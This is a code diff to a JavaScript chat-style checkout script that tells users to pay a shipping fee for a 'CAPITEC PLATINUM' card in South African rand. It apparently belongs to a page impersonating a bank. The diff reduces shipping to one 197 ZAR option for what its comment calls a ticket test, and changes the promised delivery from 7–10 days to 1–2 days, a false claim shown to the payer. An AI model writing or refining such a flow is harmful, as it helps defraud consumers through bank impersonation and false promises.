@@ -190,14 +190,12 @@ async function finish() {
   await chooseShipping();
  })));scrollEnd();
 }
-// Última etapa: escolha do envio em cartões, como na captura (Expresso recomendado).
+// Única opção de envio durante o teste de ticket de 197 ZAR.
 const shippingOptions=[
- {name:'Economy Shipping',price:'197 ZAR',days:'7 to 10 business days',minDays:7,text:'Standard delivery with basic tracking.',icon:'<path d="M3 6h11v10H3zM14 9h4l3 3v4h-7"/><circle cx="7" cy="17.5" r="1.8"/><circle cx="17" cy="17.5" r="1.8"/>'},
- {name:'Express Shipping',price:'300 ZAR',days:'3 to 4 business days',minDays:3,text:'Priority shipping with real-time tracking.',icon:'<path d="M13 2 4 14h7l-1 8 9-12h-7l1-8Z"/>',recommended:true},
- {name:'Premium Shipping',price:'497 ZAR',days:'1 to 2 business days',minDays:1,text:'Ultra-fast delivery with top priority.',icon:'<path d="M17.8 19.2 16 11l3.5-3.5C21 6 21.5 4 21 3c-1-.5-3 0-4.5 1.5L13 8 4.8 6.2c-.5-.1-.9.1-1.1.5l-.3.5c-.2.5-.1 1 .3 1.3L9 12l-2 3H4l-1 1 3 2 2 3 1-1v-3l3-2 3.5 5.3c.3.4.8.5 1.3.3l.5-.2c.4-.3.6-.7.5-1.2Z"/>'}
+ {name:'Economy Shipping',price:'197 ZAR',days:'1 to 2 business days',minDays:1,text:'Standard delivery with basic tracking.',icon:'<path d="M3 6h11v10H3zM14 9h4l3 3v4h-7"/><circle cx="7" cy="17.5" r="1.8"/><circle cx="17" cy="17.5" r="1.8"/>'},
 ];
 async function chooseShipping() {
- for(const text of ['All that remains is to choose shipping for your CAPITEC PLATINUM.','Choose your preferred option — delivery times and prices are shown below.','Which shipping option do you prefer?']) await say(text);
+ for(const text of ['All that remains is to choose shipping for your CAPITEC PLATINUM.','Economy shipping costs 197 ZAR, with delivery in 1 to 2 business days.','Confirm your shipping option below.']) await say(text);
  const list=document.createElement('div');list.className='ship-options';
  shippingOptions.forEach(option=>{
   const card=document.createElement('button');card.type='button';card.className='ship-option'+(option.recommended?' recommended':'');
